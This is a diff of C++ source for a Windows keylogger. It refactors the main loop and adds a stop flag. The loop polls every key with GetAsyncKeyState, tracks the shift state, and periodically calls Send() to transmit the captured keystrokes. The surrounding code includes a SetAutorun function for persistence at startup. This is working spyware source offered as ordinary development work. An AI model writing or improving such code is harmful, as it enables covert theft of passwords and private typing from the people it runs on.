@@ -51,9 +51,9 @@ const char* keyStringsNoShift[] =
 	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
 };
 
-Keylogger::Keylogger()
+Keylogger::Keylogger() : shouldStop(false)
 {
-	std::fill(std::begin(keysActive), std::end(keysActive), false);
+	memset(keysActive, false, sizeof(keysActive));
 
 	GetModuleFileName(NULL, exeName, MAX_PATH);
 
@@ -78,22 +78,21 @@ Keylogger::~Keylogger()
 
 void Keylogger::Run()
 {
-	bool runLoop = true;
 	DWORD ticksLast = GetTickCount();
-	DWORD ticksNow;
 
-	while(runLoop)
+	for (;;)
 	{
 		Sleep(V_IDLE_TIME);
 
-		ticksNow = GetTickCount();
-
-		if(ticksNow - ticksLast >= V_SEND_INTERVAL)
+		if (GetTickCount() - ticksLast >= V_SEND_INTERVAL)
 		{
-			ticksLast = GetTickCount();
-
 			this->Send();
 			keysPressed.clear();
+
+			if (this->shouldStop)
+				break;
+
+			ticksLast = GetTickCount();
 		}
 
 		bool shift = ((GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0)
@@ -103,6 +102,10 @@ void Keylogger::Run()
 			this->CheckKey(i, shift);
 		}
 	}
+}
+void Keylogger::Stop()
+{
+	this->shouldStop = true;
 }
 
 bool Keylogger::SetAutorun(bool autorun)
